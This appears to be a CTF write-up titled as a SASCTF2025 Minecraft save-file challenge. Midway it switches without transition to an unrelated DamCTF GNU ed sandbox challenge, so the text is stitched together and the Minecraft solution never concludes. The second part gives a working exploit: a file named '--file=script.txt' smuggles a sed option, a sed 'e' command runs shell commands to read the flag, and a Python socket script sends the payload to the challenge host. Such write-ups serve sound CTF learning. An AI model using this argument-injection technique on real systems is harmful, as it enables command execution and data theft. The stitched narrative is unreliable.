# SASCTF2025 - Library writeup

- Write-Up Author: looy3 


## Write up  

---


The description was " I know nobody likes reading, but this book worth reading from cover to cover. Already finished? Draw the conclusion.  Version: 1.21."
Based on the category (minecraft), the nature of the challenge was pretty obvious.
Unzipping the attached .zip, I found the following contents:
```
Library % ls
DIM1  DIM-1  advancements  data  entities  icon.png  level.dat  level.dat_old  playerdata  poi  region  session.lock  stats
```
Pretty obviously a minecraft saves file. We not only have level data, an icon, region data, but we also have advancements (which are saved locally in minecraft). I moved it to my C:/Users/tjesau/AppData/Roaming/.minecraft/saves and booted up minecraft. Sure enough, minecraft recognized it as a valid save file. The world I loaded into looked like this:
![I hate alt text](https://github.com/looy3/ctf-writeups/blob/main/SASCTF2025/minecraft/world.png)
![I hate alt text](https://github.com/looy3/ctf-writeups/blob/main/SASCTF2025/minecraft/books.png)
![I hate alt text](https://github.com/looy3/ctf-writeups/blob/main/SASCTF2025/minecraft/book.png)

As you can see, it was a single chunk with a ton of item frames with books containing the entirety of Moby Dick inside. I used to play around with command blocks a lot, so I quickly knew that these were entities. Thus, I navigated to the saves/Library/entities. Only one anvil file had a size indicating so much text: r.0.0.mca. It was 1.6MB, which indicates a looooot of entities or entity data. Having previously needed to delete entity data on a minecraft server (to prevent crashing/fix a corrupted save), I knew where to go to access it. I downloaded an app called NBTExplorer (In hindsight, use NBTStudio, it's way better), loaded the relevant mca file, and searched for values which might be related to the challenge. "SAS" revealed nothing but "{" gave me this: 
```
These are some other differences:

# as a comment character.

GNU: # is a comment command.
BSD: # is not a valid command.
Plan 9: Like BSD.
POSIX: Like BSD.
Behavior destroying unsaved work.

GNU: e, e !, and q always fails on the first try if the buffer is unsaved.
BSD: Like GNU, but using -s disables the warning.
Plan 9: Like GNU.
POSIX: Like GNU.
Exit status (this is a bit difficult to test thoroughly).

GNU: Terminates with a non-zero exit status if the last command caused an error.
BSD: Most errors cause non-zero termination only with -s.
Plan 9: Seems to never terminate with non-zero exit status.
POSIX: Termination with a zero exit status means "Successful completion without any file or command errors."
The s/// command, but with only the first /.

GNU: s/RE is an error.
BSD: s/RE behaves like s/RE/, which is the same as s/RE//p, i.e. it replaces the substring matching the regular expression RE with nothing and prints the modified line.
Plan 9: Like BSD.
POSIX: Like GNU.
Using ^ as an address.

GNU: ^ is an invalid address.
BSD: ^ addresses the previous line, just like -.
Plan 9: Like BSD.
POSIX: Permits ^ to be the same as -.
Combining the printing commands p, l, and n (like nl), and repeating commands while doing so (as in nlnl or pnnn).

GNU: Combining printing commands is allowed. Repeated commands are not permitted (although pp, nn, and ll are allowed since the standard allows adding p, n, or l to commands other than e, E, f, q, Q, r, w, or !).
BSD: Combining printing commands is allowed. Repeated commands are permitted.
Plan 9: Combinations of two commands out of the three are permitted (not nlp). Repeated commands are not allowed.
POSIX: The effect of combining printing commands is "unspecified".
Upon receiving a HUP signal, the current editing buffer is saved in a file called ed.hup in the current directory. If that fails, the buffer is written to $HOME/ed.hup. What happens if these names already exist?

GNU: The file ed.hup in the current directory will be overwritten if it is a regular file and it's owned by the current user. Otherwise, the file $HOME/ed.hup will be overwritten if it is a regular file owned by the current user. Otherwise, the buffer is lost.
BSD: Like GNU, but the current buffer is also available in a temporary file whose name matches /tmp/ed.*.
Plan 9: Like GNU.
POSIX: Like GNU.`
```
The challenge used GNU ed. Unfortunately, GNU ed doesn't really have any unique commands which would allow me to execute code externally.

Thus, as per my initial hunch, I assumed that either the file name or file contents are executed by something. To test this, I simply devised a python script (not using pwntools, although I should have :P) to test every possible ASCII combination in both the file name and file contents and then wrote it to the local directory (which is allowed under red). Two ASCII characters stood out to me: Both '-' and '.' yielded this error:
```
sed: invalid option -- ' '
Usage: sed [OPTION]... {script-only-if-no-other-script} [input-file]...

  -n, --quiet, --silent
                 suppress automatic printing of pattern space
      --debug
                 annotate program execution
  -e script, --expression=script
                 add the script to the commands to be executed
  -f script-file, --file=script-file
                 add the contents of script-file to the commands to be executed
  --follow-symlinks
                 follow symlinks when processing in place
  -i[SUFFIX], --in-place[=SUFFIX]
                 edit files in place (makes backup if SUFFIX supplied)
  -l N, --line-length=N
                 specify the desired line-wrap length for the `l' command
  --posix
                 disable all GNU extensions.
  -E, -r, --regexp-extended
                 use extended regular expressions in the script
                 (for portability use POSIX -E).
  -s, --separate
                 consider files as separate rather than as a single,
                 continuous long stream.
      --sandbox
                 operate in sandbox mode (disable e/r/w commands).
  -u, --unbuffered
                 load minimal amounts of data from the input files and flush
                 the output buffers more often
  -z, --null-data
                 separate lines by NUL characters
      --help     display this help and exit
      --version  output version information and exit

If no -e, --expression, -f, or --file option is given, then the first
non-option argument is taken as the sed script to interpret.  All
remaining arguments are names of input files; if no input files are
specified, then the standard input is read
```
You can see the steps I took to manually get this error:
![I hate alt text](https://github.com/looy3/ctf-writeups/blob/main/DamCTF/misc/imsadsadsadsaage.png)

I didn't bother with executing code from sed using . and rather focused on -. First, I tried --version. This worked. I found that we were using the latest version of GNU Sed.
```
[Sun May 11 13:00:19 UTC 2025] Welcome, editor!
Feel free to write in this temporary scratch space.
All data will be deleted when you're done, but files will
first be printed to stdout in case you want to keep them.
10
sed (GNU sed) 4.9
Packaged by Debian
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by Jay Fenlason, Tom Lord, Ken Pizzini,
Paolo Bonzini, Jim Meyering, and Assaf Gordon.

This sed program was built with SELinux support.
SELinux is disabled on this system.

GNU sed home page: <https://www.gnu.org/software/sed/>.
General help using GNU software: <https://www.gnu.org/gethelp/>.
E-mail bug reports to: <bug-sed@gnu.org>.
```
Cool. We can use sed. I tried other payloads, including 
```-n 's/.*/COMMAND/e'```
Dir access was blocked. Sed does allow for numerous wild cards though. But even then, sed only replied that it could not execute '' . It was reading my input as a singular string. I'd have to find a way to execute commands which could be written in a single string. Sed's man page reported the following:
```
--file=script-file

              add the contents of script-file to the commands to be executed
```
Pretty sure I could use that to execute a script file I made using ed (as I could only run one command in sed before session ended). Thus, the following payload, which contains a sed command 
```(s/.*/cd ..; ls .. -a; cd ..; cat flag/e)``` 

inside a script named 'script.txt' is executed by another file written as --file=script.txt with contents --file=script.txt. This finally provided the much wanted flag:

```
dam{is_it_w31rd_that_i_u53_ed(1)_4_fun?}
```

This is the full script with all of its sockets :P
```python
import socket
import string

def send_to_netcat(host, port, data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            s.sendall(data.encode())
            s.shutdown(socket.SHUT_WR)

            response = b""
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
            return response.decode()
    except Exception as e:
        return f"Error: {e}"

if __name__ == "__main__":
    host = "standard-editor.chals.damctf.xyz"
    port = 6733
    commands = f"H\na\ns/.*/cd ..; ls .. -a; cd ..; cat flag/e\n.\nw script.txt\n1d\na\n--file=script.txt\n.\nw --file=script.txt\n"  
    data = commands
    response = send_to_netcat(host, port, data)
    print(response)
    print("\n\n\n")
```

